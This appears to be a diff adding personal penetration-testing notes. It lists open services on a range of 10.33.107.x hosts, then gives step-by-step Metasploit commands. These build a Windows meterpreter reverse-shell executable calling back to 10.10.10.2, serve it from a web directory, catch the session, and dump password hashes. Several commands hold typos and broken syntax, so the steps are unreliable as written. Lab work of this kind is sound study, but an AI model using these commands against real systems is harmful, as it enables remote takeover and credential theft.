@@ -1,0 +1,32 @@
+No.	Layanan	Port	Alamat IP
+1	http		80	10.33.107.3, 10.33.107.26, 10.33.107.98, 10.33.107.105, 10.33.107.106, 10.33.107.125, 10.33.107.170, 10.33.107.179, 10.33.107.201, 	10.33.107.252
+2	ftp		21	10.33.107.252, 10.33.107.254
+3	Ssh		22	10.33.107.105, 10.33.107.106,10.33.107.179, 10.33.107.201, 10.33.107.208, 10.33.107.212
+4	Mysql	3306	10.33.107.201, 10.33.107.212
+5	vnc		5900	10.33.107.130, 10.33.107.131, 10.33.107.170, 10.33.107.211
+
+
+BUILD EXPLOIT
+msfvenom -p windows/x64/meterpreter/reverse/tcp --platform windows =b "\x00
+LHOST=10.10.10.2 -f exe > Desktop/exploit.exe
+
+SHARE VIA WEBSERVER
+cp /root/Desktop/exploit.exe /var/www/html/share
+
+RUN metasploit 
+msfconsole
+
+msf>use exploit/multi/handler
+msf exploit(multi/handler)> set payload windows/x64/meterpereter
+msf exploit(multi/handler)>set LHOST 10.10.10.2 
+msf exploit(multi/handler)> exploit -j -2 
+
+sessions -i l
+meterpreter > getuid 
+meterpreter > run post/windows/gather/smart_hashdump 
+meterpreter > getuid 
+meterpreter > background 
+meterpreter > use exploit/windows
+
+
+
